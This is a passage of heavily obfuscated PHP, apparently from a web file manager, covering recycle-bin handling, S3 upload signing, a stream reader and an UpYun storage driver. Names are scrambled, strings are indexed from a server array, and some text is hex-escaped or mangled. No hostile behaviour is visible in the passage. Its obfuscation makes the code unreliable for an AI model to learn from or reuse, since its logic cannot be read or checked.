$Í¯ò÷—[402]); } public function moveToRecycle($»®³ı«Á) { $ÅË°•šá =& $_SERVER[şÒÁøÒÄ]; $Ï²…ÜÁ² = Model($ÅË°•šá[1352]); $äàã½ü = $Ï²…ÜÁ²->sourceInfo($»®³ı«Á); if (!$äàã½ü || $äàã½ü[$ÅË°•šá[431]] == $ÅË°•šá[88]) { return; } $Êä›¦… = array($ÅË°•šá[417] => $»®³ı«Á, $ÅË°•šá[1671] => USER_ID, $ÅË°•šá[576] => $äàã½ü[$ÅË°•šá[411]], $ÅË°•šá[577] => $äàã½ü[$ÅË°•šá[496]], $ÅË°•šá[580] => $äàã½ü[$ÅË°•šá[511]]); $this->add($Êä›¦…); $this->recycleMove($»®³ı«Á, 1); if ($äàã½ü[$ÅË°•šá[410]] == $ÅË°•šá[88]) { $¾øÀ ¼€ = array($ÅË°•šá[580] => array($ÅË°•šá[540], $äàã½ü[$ÅË°•šá[511]] . $»®³ı«Á . $ÅË°•šá[541])); $Ï²…ÜÁ²->where($¾øÀ ¼€)->setField($ÅË°•šá[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ø‘È¡’è = false, $§Úôš‰ = false) { $¬·ƒ›Ë— =& $_SERVER[şÒÁøÒÄ]; $§Úôš‰ = $§Úôš‰ ? $§Úôš‰ : USER_ID; $ÚÚ÷òŠš = Model($¬·ƒ›Ë—[1352]); $üëŒãíØ = $this->listData($§Úôš‰); $ø‘È¡’è = $ø‘È¡’è === !1 ? !1 : $ø‘È¡’è; $ÆİÖ‘Ö† = array(); foreach ($üëŒãíØ as $Åñè×ıÏ) { if ($ø‘È¡’è != !1 && !in_array($Åñè×ıÏ, $ø‘È¡’è)) { continue; } $æ¯àÇ¸ë = $ÚÚ÷òŠš->sourceInfo($Åñè×ıÏ); $ÚÚ÷òŠš->remove($Åñè×ıÏ, !1); $îËÍÌ¬¸ = $æ¯àÇ¸ë[$¬·ƒ›Ë—[411]] . $¬·ƒ›Ë—[11] . $æ¯àÇ¸ë[$¬·ƒ›Ë—[496]]; $ÆİÖ‘Ö†[$îËÍÌ¬¸] = array($¬·ƒ›Ë—[576] => $æ¯àÇ¸ë[$¬·ƒ›Ë—[411]], $¬·ƒ›Ë—[496] => $æ¯àÇ¸ë[$¬·ƒ›Ë—[496]]); $this->where(array($¬·ƒ›Ë—[402] => $Åñè×ıÏ))->delete(); } foreach ($ÆİÖ‘Ö† as $·œŸéÕô) { $ÚÚ÷òŠš->targetSpaceUpdate($·œŸéÕô[$¬·ƒ›Ë—[411]], $·œŸéÕô[$¬·ƒ›Ë—[496]]); } } public function restore($ùÛ‡±Ùº = false) { $¬ßÊ ¤Ÿ = $this->listData(); $this->_restoreSource($¬ßÊ ¤Ÿ, $ùÛ‡±Ùº); } public function removeUserAll($èúº¥º) { $this->remove(!1, $èúº¥º); } private function _restoreSource($ƒşúÊ†¨, $’ªµç­‚) { $‡ªÚ¢Ëø =& $_SERVER[şÒÁøÒÄ]; $ÌÚœÁÙÇ = Model($‡ªÚ¢Ëø[1352]); $’ªµç­‚ = $’ªµç­‚ == !1 ? !1 : $’ªµç­‚; if (!$ƒşúÊ†¨) { return !0; } $ÎÜÒ„¬û = array(); foreach ($ƒşúÊ†¨ as $„‡¼±¾¶) { if ($’ªµç­‚ != !1 && !in_array($„‡¼±¾¶, $’ªµç­‚)) { continue; } $·°¤ç = $ÌÚœÁÙÇ->sourceInfo($„‡¼±¾¶); $óƒ•¤áİ = $ÌÚœÁÙÇ->sourceInfo($·°¤ç[$‡ªÚ¢Ëø[432]]); if ($óƒ•¤áİ[$‡ªÚ¢Ëø[431]] == $‡ªÚ¢Ëø[88]) { continue; } $ÌÚœÁÙÇ->lockMoveStart($„‡¼±¾¶); $this->recycleMove($„‡¼±¾¶, 0); if ($·°¤ç[$‡ªÚ¢Ëø[410]] == $‡ªÚ¢Ëø[88]) { $Ò×ó†­ = array($‡ªÚ¢Ëø[580] => array($‡ªÚ¢Ëø[540], $·°¤ç[$‡ªÚ¢Ëø[511]] . $„‡¼±¾¶ . $‡ªÚ¢Ëø[541])); $ÌÚœÁÙÇ->where($Ò×ó†­)->setField($‡ªÚ¢Ëø[431], 0); $this->restoreFolderChildren($„‡¼±¾¶, $ƒşúÊ†¨); } $this->where(array($‡ªÚ¢Ëø[402] => $„‡¼±¾¶))->delete(); $ÌÚœÁÙÇ->folderSizeReset($·°¤ç[$‡ªÚ¢Ëø[432]]); $ÎÜÒ„¬û[] = $·°¤ç[$‡ªÚ¢Ëø[432]]; if ($·°¤ç[$‡ªÚ¢Ëø[410]] == $‡ªÚ¢Ëø[88]) { $ÎÜÒ„¬û[] = $„‡¼±¾¶; } $ÌÚœÁÙÇ->lockMoveEnd($„‡¼±¾¶); } $ÌÚœÁÙÇ->updateModifyTime($ÎÜÒ„¬û); } private function restoreFolderChildren($Å„óù€•, $Î¾¡¬¾) { $…†µ¿‰º =& $_SERVER[şÒÁøÒÄ]; $ğª÷öÇÜ = Model($…†µ¿‰º[1352]); $¢×™¯ü„ = array($…†µ¿‰º[402] => array($…†µ¿‰º[7], array())); foreach ($Î¾¡¬¾ as $ìõï¡ìÑ) { if ($ìõï¡ìÑ == $Å„óù€•) { continue; } if (!$ğª÷öÇÜ->isParentOf($Å„óù€•, $ìõï¡ìÑ)) { continue; } $ñ½Ş…š = $ğª÷öÇÜ->sourceInfo($ìõï¡ìÑ); if ($ñ½Ş…š[$…†µ¿‰º[410]] == $…†µ¿‰º[88]) { $¢×™¯ü„[] = array($…†µ¿‰º[580] => array($…†µ¿‰º[540], $ñ½Ş…š[$…†µ¿‰º[511]] . $ìõï¡ìÑ . $…†µ¿‰º[541])); } else { $¢×™¯ü„[$…†µ¿‰º[402]][1][] = $ìõï¡ìÑ; } } if (!$¢×™¯ü„[$…†µ¿‰º[402]][1]) { unset($¢×™¯ü„[$…†µ¿‰º[402]]); } if (!$¢×™¯ü„) { return; } $¢×™¯ü„[$…†µ¿‰º[402]][1] = array_unique($¢×™¯ü„[$…†µ¿‰º[402]][1]); $¢×™¯ü„[$…†µ¿‰º[1013]] = $…†µ¿‰º[1967]; $ğª÷öÇÜ->where($¢×™¯ü„)->setField($…†µ¿‰º[431], 1); } private function recycleMove($ìÍ©Í„‚, $á «’‹Â = 1) { $ÌØÛò¶· =& $_SERVER[şÒÁøÒÄ]; $Äìœğ‰¤ = Model($ÌØÛò¶·[1352]); $äø¬¹Ç¸ = Model($ÌØÛò¶·[2182]); $ù›Ù®åá = array($ÌØÛò¶·[402] => $ìÍ©Í„‚); if ($á «’‹Â) { $Äìœğ‰¤->where($ù›Ù®åá)->setField($ÌØÛò¶·[431], 1); $äø¬¹Ç¸->eventRecycle($ìÍ©Í„‚, $ÌØÛò¶·[2183]); } else { $£ÜƒÙ÷¦ = $Äìœğ‰¤->where($ù›Ù®åá)->find(); $¼•ÌÄ©» = $£ÜƒÙ÷¦[$ÌØÛò¶·[410]] == $ÌØÛò¶·[88]; $¸½¦›– = $Äìœğ‰¤->fileNameAuto($£ÜƒÙ÷¦[$ÌØÛò¶·[432]], $£ÜƒÙ÷¦[$ÌØÛò¶·[32]], REPEAT_RENAME_FOLDER, $¼•ÌÄ©»); if ($¸½¦›– != $£ÜƒÙ÷¦[$ÌØÛò¶·[32]]) { $Äìœğ‰¤->rename($ìÍ©Í„‚, $¸½¦›–); } $Äìœğ‰¤->where($ù›Ù®åá)->setField($ÌØÛò¶·[431], 0); $äø¬¹Ç¸->eventRecycle($ìÍ©Í„‚, $ÌØÛò¶·[2184]); } } } goto F›™ ‹ ÂÎ; cĞ¦Õš½Ü¬: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($€Ÿ´Š¯Ì) { parent::__construct($€Ÿ´Š¯Ì); } public function uploadFormData($›¼¿Ç, $¯“«•Ó = 3600) { $¡ãĞñ²„ =& $_SERVER[şÒÁøÒÄ]; $Ò¹áÈüÛ = $¡ãĞñ²„[199]; $ÕÆ§ï = $¡ãĞñ²„[1373]; $ËİİåîÑ = $¡ãĞñ²„[62]; $  ¼¯¨ = gmdate($¡ãĞñ²„[1374]); $ñĞËá­ú = gmdate($¡ãĞñ²„[758]); $¼Ë¦¡ö = $¡ãĞñ²„[1375]; $òÕñ¸¡¡ = $¯“«•Ó . $¡ãĞñ²„[12]; $Ê¢ÌßÙ† = $¡ãĞñ²„[1335]; $ÛìĞÏú° = array($this->accessKey, $ñĞËá­ú, $this->region, $ËİİåîÑ, $¼Ë¦¡ö); $Ÿ“ÙÖŠ¤ = implode($¡ãĞñ²„[8], $ÛìĞÏú°); $Âè¯ñ§É = array($¡ãĞñ²„[1337] => gmdate($¡ãĞñ²„[1336], strtotime($¡ãĞñ²„[1376])), $¡ãĞñ²„[1338] => array(array($¡ãĞñ²„[1340] => $this->bucket), array($¡ãĞñ²„[1339] => $Ò¹áÈüÛ), array($¡ãĞñ²„[1341], $¡ãĞñ²„[1342], $¡ãĞñ²„[12]), array($¡ãĞñ²„[1341], $¡ãĞñ²„[1377], $¡ãĞñ²„[12]), array($¡ãĞñ²„[1341], $¡ãĞñ²„[1378], $¡ãĞñ²„[12]), array($¡ãĞñ²„[1343] => $Ê¢ÌßÙ†), array($¡ãĞñ²„[1379] => $Ÿ“ÙÖŠ¤), array($¡ãĞñ²„[1380] => $ÕÆ§ï), array($¡ãĞñ²„[1381] => $  ¼¯¨), array($¡ãĞñ²„[1382] => $òÕñ¸¡¡))); $à­à–Úâ = base64_encode(json_encode($Âè¯ñ§É)); $ı·ËÒ‹¼ = hash_hmac($¡ãĞñ²„[1383], $ñĞËá­ú, $¡ãĞñ²„[1384] . $this->secret, !0); $×‰µ­™’ = hash_hmac($¡ãĞñ²„[1383], $this->region, $ı·ËÒ‹¼, !0); $Äùñ“íŸ = hash_hmac($¡ãĞñ²„[1383], $ËİİåîÑ, $×‰µ­™’, !0); $»ä©Æ‘· = hash_hmac($¡ãĞñ²„[1383], $¼Ë¦¡ö, $Äùñ“íŸ, !0); $ååÂºãİ = hash_hmac($¡ãĞñ²„[1383], $à­à–Úâ, $»ä©Æ‘·); $ç™òº‘  = array($¡ãĞñ²„[215] => $¡ãĞñ²„[12], $¡ãĞñ²„[1385] => $¡ãĞñ²„[12], $¡ãĞñ²„[1339] => $Ò¹áÈüÛ, $¡ãĞñ²„[1343] => $Ê¢ÌßÙ†, $¡ãĞñ²„[1347] => $à­à–Úâ, $¡ãĞñ²„[1386] => $Ÿ“ÙÖŠ¤, $¡ãĞñ²„[1387] => $ÕÆ§ï, $¡ãĞñ²„[1388] => $  ¼¯¨, $¡ãĞñ²„[1389] => $òÕñ¸¡¡, $¡ãĞñ²„[1390] => $ååÂºãİ, $¡ãĞñ²„[182] => $this->getHost()); return $ç™òº‘ ; } public function multiUploadFormData($åÒÀ©Şë, $ğÜ·Ãş = 3600) { $×Ïé·ˆ =& $_SERVER[şÒÁøÒÄ]; $û½‚íçå = gmdate($×Ïé·ˆ[1469]); $¿ìÅºĞŸ = array(); $ÙÆ±¬É‡ = $this->client->getUploadId($this->bucket, $åÒÀ©Şë, $¿ìÅºĞŸ); if (!$ÙÆ±¬É‡) { return !1; } return array($×Ïé·ˆ[223] => $ÙÆ±¬É‡, $×Ïé·ˆ[182] => $this->getHost() . $×Ïé·ˆ[8] . $this->pathEncode($åÒÀ©Şë), $×Ïé·ˆ[224] => $û½‚íçå, $×Ïé·ˆ[94] => $åÒÀ©Şë); } public function multiUploadAuthData($ÜëÌâÍÃ, $âéõºİş = array()) { $µ½¥ÓÀ =& $_SERVER[şÒÁøÒÄ]; $Ìç­½ã÷ = isset($âéõºİş[$µ½¥ÓÀ[174]]) ? $âéõºİş[$µ½¥ÓÀ[174]] : $µ½¥ÓÀ[12]; $„—£š§ = $âéõºİş[$µ½¥ÓÀ[94]]; unset($âéõºİş[$µ½¥ÓÀ[94]]); if (isset($âéõºİş[$µ½¥ÓÀ[225]])) { return $this->listUploadParts($„—£š§, $âéõºİş); } $µöà»î¯ = array(); if (isset($âéõºİş[$µ½¥ÓÀ[1470]])) { $µöà»î¯[$µ½¥ÓÀ[1471]] = $âéõºİş[$µ½¥ÓÀ[1470]]; } $“ˆÃÒ« = explode($µ½¥ÓÀ[184], $this->getHost()); $—«ø’ƒ‘ = array($µ½¥ÓÀ[1472] => $“ˆÃÒ«[1], $µ½¥ÓÀ[1473] => $µ½¥ÓÀ[12], $µ½¥ÓÀ[215] => $µ½¥ÓÀ[120], $µ½¥ÓÀ[1385] => $âéõºİş[$µ½¥ÓÀ[76]]); $ƒ¿—”˜ş = $µ½¥ÓÀ[228]; $˜¶¿ Ï‰ = $µ½¥ÓÀ[8] . $this->pathEncode($„—£š§) . $Ìç­½ã÷; $øí±Ù—˜ = $this->client->__getSignatureV4($µöà»î¯, $—«ø’ƒ‘, $ƒ¿—”˜ş, $˜¶¿ Ï‰); if (strpos($Ìç­½ã÷, $µ½¥ÓÀ[227]) === 0) { if (isset($µöà»î¯[$µ½¥ÓÀ[1471]])) { $œË¼îñ¹ = $µöà»î¯[$µ½¥ÓÀ[1471]]; } else { if (isset($øí±Ù—˜[$µ½¥ÓÀ[1471]])) { $œË¼îñ¹ = $øí±Ù—˜[$µ½¥ÓÀ[1471]]; } else { $œË¼îñ¹ = hash($µ½¥ÓÀ[1383], $µ½¥ÓÀ[12]); } } return array($µ½¥ÓÀ[234] => $øí±Ù—˜[$µ½¥ÓÀ[234]], $µ½¥ÓÀ[1471] => $œË¼îñ¹, $µ½¥ÓÀ[224] => $øí±Ù—˜[$µ½¥ÓÀ[1474]]); } return $øí±Ù—˜[$µ½¥ÓÀ[234]]; } public function listUploadParts($â™»³ÂŸ, $îˆò¯İ = array()) { $–ÏùÉê› =& $_SERVER[şÒÁøÒÄ]; $ö¡«ªõ‘ = str_replace($–ÏùÉê›[235], $–ÏùÉê›[12], $îˆò¯İ[$–ÏùÉê›[174]]); $ƒªü©¢Ä = $this->client->listParts($this->bucket, $â™»³ÂŸ, $ö¡«ªõ‘); if (!$ƒªü©¢Ä) { return !1; } $ââ¬‡¬· = $–ÏùÉê›[1475]; foreach ($ƒªü©¢Ä as $ºİ»õß“) { $ââ¬‡¬· .= $–ÏùÉê›[1476] . "\x3c\x50\x61\162\x74\x4e\x75\x6d\142\145\162\x3e{$ºİ»õß“[$–ÏùÉê›[1430]]}\74\x2f\x50\x61\162\164\116\x75\x6d\142\145\162\x3e\12" . "\74\105\x54\141\x67\76{$ºİ»õß“[$–ÏùÉê›[1431]]}\74\x2f\x45\124\141\147\76\12" . $–ÏùÉê›[1477]; } $ââ¬‡¬· .= $–ÏùÉê›[1478]; $øª¡´©… = array(); $ßÀ¡ÄÏ· = explode($–ÏùÉê›[184], $this->getHost()); $ùöã€‹ = array($–ÏùÉê›[1472] => $ßÀ¡ÄÏ·[1], $–ÏùÉê›[215] => $–ÏùÉê›[120], $–ÏùÉê›[1385] => strlen($ââ¬‡¬·)); $ ”½±»¦ = $–ÏùÉê›[226]; $åäŞ§¼œ = $–ÏùÉê›[8] . $this->pathEncode($â™»³ÂŸ) . $îˆò¯İ[$–ÏùÉê›[174]]; $ÇÑŞ«‹ï = $this->client->__getSignatureV4($øª¡´©…, $ùöã€‹, $ ”½±»¦, $åäŞ§¼œ, $ââ¬‡¬·); return array($–ÏùÉê›[234] => $ÇÑŞ«‹ï[$–ÏùÉê›[234]], $–ÏùÉê›[224] => $ÇÑŞ«‹ï[$–ÏùÉê›[1474]], $–ÏùÉê›[236] => $ƒªü©¢Ä, $–ÏùÉê›[1471] => $ÇÑŞ«‹ï[$–ÏùÉê›[1471]]); } public function link($Æõ«òá®, $±ò«Ïİù = array()) { return parent::link($Æõ«òá®, $±ò«Ïİù); } public function fileOut($ªñÃ“¼‰, $úñš¿á = false, $Æ©öÍ­¯ = false, $¼ºğ¶Õ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[şÒÁøÒÄ][1479])) { return parent::fileOutServer($ªñÃ“¼‰, $úñš¿á, $Æ©öÍ­¯, $¼ºğ¶Õ); } parent::fileOut($ªñÃ“¼‰, $úñš¿á, $Æ©öÍ­¯, $¼ºğ¶Õ); } public function fileOutImage($£¦¸ÛÕÜ, $•¤ß­Ô× = 250) { if (strstr($this->endpoint, $_SERVER[şÒÁøÒÄ][1479])) { return parent::fileOutImageServer($£¦¸ÛÕÜ, $•¤ß­Ô×); } parent::fileOutImage($£¦¸ÛÕÜ, $•¤ß­Ô×); } public function fileOutLink($çÌÒ´š) { $¢ìäÑ =& $_SERVER[şÒÁøÒÄ]; if (substr($çÌÒ´š, 0, 7) == $¢ìäÑ[1350]) { $çÌÒ´š = $¢ìäÑ[1351] . substr($çÌÒ´š, 7); } header($¢ìäÑ[161] . $çÌÒ´š); die; } public function getHost() { $†Ë¢Àñî =& $_SERVER[şÒÁøÒÄ]; $ˆ®äË = str_rtrim(parent::getHost(), $†Ë¢Àñî[8] . $this->bucket); $ˆ®äË = explode($†Ë¢Àñî[184], $ˆ®äË); return $ˆ®äË[0] . $†Ë¢Àñî[184] . $this->bucket . $†Ë¢Àñî[10] . $ˆ®äË[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ªŠşçÓÕ, $œŒ­Òóë = 0) { parent::__construct(); $this->source = $ªŠşçÓÕ; $this->sourceSize = $œŒ­Òóë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ìˆêª¯º = false) { return $this->sourceSize; } public function getContent($Š¸å±Ÿ£ = false) { return $this->fileSubstr($Š¸å±Ÿ£, 0, $this->sourceSize); } public function fileSubstr($ãÖüÚšÄ = false, $‹›Øı›ø = 0, $¢Î”£¸ = 0) { if (!$¢Î”£¸) { $¢Î”£¸ = $this->sourceSize; } $•ò€¥…­ = $this->sourceSize - $‹›Øı›ø; if ($¢Î”£¸ >= $•ò€¥…­) { $¢Î”£¸ = $•ò€¥…­; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‹›Øı›ø, $¢Î”£¸); } if ($this->sourceType == self::TYPE_FILE) { if ($¢Î”£¸ <= 0) { return $_SERVER[şÒÁøÒÄ][12]; } $Ò¤Ã¬ƒĞ = ftell($this->source); fseek_64($this->source, $Ò¤Ã¬ƒĞ + $‹›Øı›ø); $ä®…ä¾Â = @fread($this->source, $¢Î”£¸); fseek_64($this->source, $Ò¤Ã¬ƒĞ); return $ä®…ä¾Â; } } public function hashMd5($Ô‡´ç¢˜ = false) { return md5($this->getContent()); } public static function hash($’±šÛ”, $É‚ëö¦ = 0) { $é›ÔÒåâ = new PathDriverStream($’±šÛ”, $É‚ëö¦); return $é›ÔÒåâ->hashSimple($’±šÛ”); } public static function md5($¹ƒ„£°Ø, $‰…“·óæ = 0) { $¶¤¿İŸš = new PathDriverStream($¹ƒ„£°Ø, $‰…“·óæ); return $¶¤¿İŸš->hashMd5($¹ƒ„£°Ø); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\57\166\x30\x2e\x61\160\x69\x2e\x75\x70\171\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¯´È’‘) { parent::__construct(); $this->_init($¯´È’‘); } public function _init($´ÔÑÁÄ) { $šœâà‘ =& $_SERVER[şÒÁøÒÄ]; foreach ($´ÔÑÁÄ as $°Åâêíä => $Àş½ƒ¡×) { if (isset($this->{$°Åâêíä})) { $this->{$°Åâêíä} = $Àş½ƒ¡×; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($šœâà‘[1480] . LNG($šœâà‘[1411])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ı€÷Şğê, $¦˜Õûæà = "\x47\105\124") { $§ôÃ­’ =& $_SERVER[şÒÁøÒÄ]; $ˆôŠÌ®ù = gmdate($§ôÃ­’[1444]); $¯†õã = base64_encode(hash_hmac($§ôÃ­’[1481], "{$¦˜Õûæà}\46{$ı€÷Şğê}\x26{$ˆôŠÌ®ù}", md5("{$this->userpass}"), !0)); $€ÑĞ¼ğà = array("\101\165\x74\x68\157\x72\x69\x7a\x61\164\x69\157\x6e\72\125\120\131\x55\x4e\40{$this->username}\72{$¯†õã}", "\x44\141\x74\145\72{$ˆôŠÌ®ù}"); return $€ÑĞ¼ğà; } public function ussRequest($³¶Ø£µ, $œÄá¥¬ = "\107\105\124", $€ÀŠò“Ô = false, $®„£®€ = false, $Ä´§óúö = false) { $¼£ëÁ¹× =& $_SERVER[şÒÁøÒÄ]; $³¶Ø£µ = trim($³¶Ø£µ, $¼£ëÁ¹×[8]); $“²äÉôõ = "\x2f{$this->bucket}\x2f{$³¶Ø£µ}"; $ğ’ÚÏ‡Ô = $this->ussHeaders($“²äÉôõ, $œÄá¥¬); if ($®„£®€) { $ğ’ÚÏ‡Ô = array_merge($ğ’ÚÏ‡Ô, $®„£®€); } $ºšéÁÂ± = url_request($this->endpoint . $“²äÉôõ, $œÄá¥¬, $€ÀŠò“Ô, $ğ’ÚÏ‡Ô, $Ä´§óúö); if (!$ºšéÁÂ±) { return array($¼£ëÁ¹×[1225] => !1, $¼£ëÁ¹×[1215] => $¼£ëÁ¹×[1482]); } if (strtolower($œÄá¥¬) == $¼£ëÁ¹×[197] || in_array($ºšéÁÂ±[$¼£ëÁ¹×[1225]], array($¼£ëÁ¹×[1335], $¼£ëÁ¹×[1483]))) { $€ÀŠò“Ô = $ºšéÁÂ±[$¼£ëÁ¹×[1484]]; } else { $€ÀŠò“Ô = json_decode($ºšéÁÂ±[$¼£ëÁ¹×[1215]], !0); if (!$€ÀŠò“Ô) { $€ÀŠò“Ô = $ºšéÁÂ±[$¼£ëÁ¹×[1215]]; } else { if (!$ºšéÁÂ±[$¼£ëÁ¹×[757]] && isset($€ÀŠò“Ô[$¼£ëÁ¹×[1485]])) { $€ÀŠò“Ô = $€ÀŠò“Ô[$¼£ëÁ¹×[1485]]; } } } return array($¼£ëÁ¹×[1225] => $ºšéÁÂ±[$¼£ëÁ¹×[757]], $¼£ëÁ¹×[1215] => $€ÀŠò“Ô); } public function mkfile($à òÏ, $²úÕ’æÈ = '', $Õé­Úâ = REPEAT_RENAME) { if ($this->setContent($à òÏ, $²úÕ’æÈ)) { return $this->getPathOuter($à òÏ); } return !1; } public function mkdir($ç€¢¾õü, $£Á”Ê†É = REPEAT_SKIP) { $Ü´ŸÃ¾ =& $_SERVER[şÒÁøÒÄ]; $ÉÔı–«à = trim($ç€¢¾õü, $Ü´ŸÃ¾[8]); if ($this->_isFolder($ÉÔı–«à)) { return $this->getPathOuter($ÉÔı–«à); } $ùÜƒòóÎ = array($Ü´ŸÃ¾[1486]); $á¸˜ª§Ä = $this->ussRequest($ÉÔı–«à, $Ü´ŸÃ¾[226], !1, $ùÜƒòóÎ); return $á¸˜ª§Ä[$Ü´ŸÃ¾[1225]] ? $this->getPathOuter($ÉÔı–«à) : !1; } public function copyFile($®Ïïé™ô, $£“ÒüÛØ) { $ÙÌƒş­ù =& $_SERVER[şÒÁøÒÄ]; $—Í¡Ğíñ = array($ÙÌƒş­ù[1487] . "\57{$this->bucket}\57{$®Ïïé™ô}", $ÙÌƒş­ù[1488]); $á±ê÷ = $this->ussRequest($£“ÒüÛØ, $ÙÌƒş­ù[228], !1, $—Í¡Ğíñ); return $á±ê÷[$ÙÌƒş­ù[1225]] ? !0 : $this->getPathOuter($£“ÒüÛØ); } public function moveFile($üúø¥Ü, $îµÏÛ³) { $™‹º¤ =& $_SERVER[şÒÁøÒÄ]; $¦â®³ú = array($™‹º¤[1489] . "\57{$this->bucket}\x2f{$üúø¥Ü}", $™‹º¤[1488]); $¢Ÿ¿ºÇÑ = $this->ussRequest($îµÏÛ³, $™‹º¤[228], !1, $¦â®³ú); return $¢Ÿ¿ºÇÑ[$™‹º¤[1225]] ? !0 : $this->getPathOuter($îµÏÛ³); } public function delFile($ğšãøÌ) { $÷«ò‰›‘ =& $_SERVER[şÒÁøÒÄ]; $ú×÷Ç¦Õ = $this->ussRequest($ğšãøÌ, $÷«ò‰›‘[1490]); return $ú×÷Ç¦Õ[$÷«ò‰›‘[1225]] ? !0 : !1; } public function delFolder($×È½Á‘ô) { $Õâ­É =& $_SERVER[şÒÁøÒÄ]; if (!$this->exist($×È½Á‘ô)) { return !0; } $this->listItemCache = !1; $Çúò¯À = $›ÅĞÛúÄ = array(); $this->fileList($×È½Á‘ô, $Çúò¯À, $›ÅĞÛúÄ, !0); $this->listItemCache = !0; foreach ($›ÅĞÛúÄ as $ëÆ‹ÖÑ÷) { $ÂÀ»ÒÊ = $this->ussRequest($ëÆ‹ÖÑ÷[$Õâ­É[32]], $Õâ­É[1490]); if (!$ÂÀ»ÒÊ[$Õâ­É[1225]]) { return !1; } } foreach ($Çúò¯À as $Ü¿µâø) { $ÂÀ»ÒÊ = $this->ussRequest($Ü¿µâø, $Õâ­É[1490]); if (!$ÂÀ»ÒÊ[$Õâ­É[1225]]) { return !1; } } $ÂÀ»ÒÊ = $this->ussRequest($×È½Á‘ô, $Õâ­É[1490]); return $ÂÀ»ÒÊ[$Õâ­É[1225]]; } public function rename($Î‡Š®¾—, $‚›Èê») { if ($this->isFile($Î‡Š®¾—)) { $‚›Èê» = get_path_father($Î‡Š®¾—) . $‚›Èê»; return $this->moveFile($Î‡Š®¾—, $‚›Èê»); } return $this->renameObject($Î‡Š®¾—, $‚›Èê»); } public function fileInfo($–Òù¾ÜŸ, $ƒëÂŞ½İ = false, $îÜÆÜ¤³ = array()) { $ûÌÁŞ‡ =& $_SERVER[şÒÁøÒÄ]; $€¤Éüõú = array($ûÌÁŞ‡[32] => $this->pathThis($–Òù¾ÜŸ), $ûÌÁŞ‡[84] => $this->getPathOuter($ûÌÁŞ‡[8] . $–Òù¾ÜŸ), $ûÌÁŞ‡[33] => $ûÌÁŞ‡[200], $ûÌÁŞ‡[76] => isset($îÜÆÜ¤³[$ûÌÁŞ‡[76]]) ? $îÜÆÜ¤³[$ûÌÁŞ‡[76]] : 0, $ûÌÁŞ‡[174] => $this->ext($–Òù¾ÜŸ)); if ($ƒëÂŞ½İ) { return $€¤Éüõú; } $€¤Éüõú[$ûÌÁŞ‡[201]] = $€¤Éüõú[$ûÌÁŞ‡[85]] = 0; $€¤Éüõú[$ûÌÁŞ‡[202]] = $€¤Éüõú[$ûÌÁŞ‡[203]] = !0; if (empty($îÜÆÜ¤³)) { $îÜÆÜ¤³ = $this->objectMeta($–Òù¾ÜŸ); if (!$îÜÆÜ¤³) { return $€¤Éüõú; } } $€¤Éüõú[$ûÌÁŞ‡[201]] = intval($îÜÆÜ¤³[$ûÌÁŞ‡[1491]]); $€¤Éüõú[$ûÌÁŞ‡[85]] = intval($îÜÆÜ¤³[$ûÌÁŞ‡[1492]]); $€¤Éüõú[$ûÌÁŞ‡[76]] = $îÜÆÜ¤³[$ûÌÁŞ‡[76]]; return $€¤Éüõú; } public function folderInfo($Ğ…‡Øå, $‚ºƒŒÔ» = false) { $³ ßåäğ =& $_SERVER[şÒÁøÒÄ]; $¦³‚ô¿‰ = array($³ ßåäğ[32] => $this->pathThis($Ğ…‡Øå), $³ ßåäğ[84] => $this->getPathOuter($³ ßåäğ[8] . $Ğ…‡Øå), $³ ßåäğ[33] => $³ ßåäğ[75]); if ($‚ºƒŒÔ») { return $¦³‚ô¿‰; } $¦³‚ô¿‰[$³ ßåäğ[201]] = $¦³‚ô¿‰[$³ ßåäğ[85]] = 0; $¦³‚ô¿‰[$³ ßåäğ[202]] = $¦³‚ô¿‰[$³ ßåäğ[203]] = !0; if (empty($¾Â‡ıØ€)) { $¾Â‡ıØ€ = $this->objectMeta($Ğ…‡Øå); if (!$¾Â‡ıØ€) { return $¦³‚ô¿‰; } } $¦³‚ô¿‰[$³ ßåäğ[201]] = intval($¾Â‡ıØ€[$³ ßåäğ[1491]]); $¦³‚ô¿‰[$³ ßåäğ[85]] = intval($¾Â‡ıØ€[$³ ßåäğ[1492]]); return $¦³‚ô¿‰; } private function listObjs($à¢“î‰, $™™ù¯Î = 0, $±Å»éãÁ = 1000) { $ºÁùıİá =& $_SERVER[şÒÁøÒÄ]; $î€±Ø÷¸ = array($ºÁùıİá[1493], $ºÁùıİá[1494] . $±Å»éãÁ); if ($™™ù¯Î) { $î€±Ø÷¸[] = $ºÁùıİá[1495] . $™™ù¯Î; } $—ÆÜËñ• = $this->ussRequest($à¢“î‰, $ºÁùıİá[230], !1, $î€±Ø÷¸); return !$—ÆÜËñ•[$ºÁùıİá[1225]] ? !1 : $—ÆÜËñ•[$ºÁùıİá[1215]]; } private function fileList($–ŸæÅÒÎ, &$‰Ïë¸–, &$¤Œö²ç£, $†€ò¸úê = false) { $÷»ñ„¯Ş =& $_SERVER[şÒÁøÒÄ]; $ÛÙÏü¡Ö = $÷»ñ„¯Ş[12]; $ùé½ëğ– = 1000; $ŠÀ¨“ıÓ = rtrim($–ŸæÅÒÎ, $÷»ñ„¯Ş[8]) . $÷»ñ„¯Ş[8]; while (!0) { check_abort(); $õöÌÆ = $this->listObjs($–ŸæÅÒÎ, $ÛÙÏü¡Ö, $ùé½ëğ–); if (!$õöÌÆ) { return !1; } $ÛÙÏü¡Ö = isset($õöÌÆ[$÷»ñ„¯Ş[1496]]) ? $õöÌÆ[$÷»ñ„¯Ş[1496]] : $÷»ñ„¯Ş[12]; $²Á©Ç­– = isset($õöÌÆ[$÷»ñ„¯Ş[1497]]) ? $õöÌÆ[$÷»ñ„¯Ş[1497]] : array(); foreach 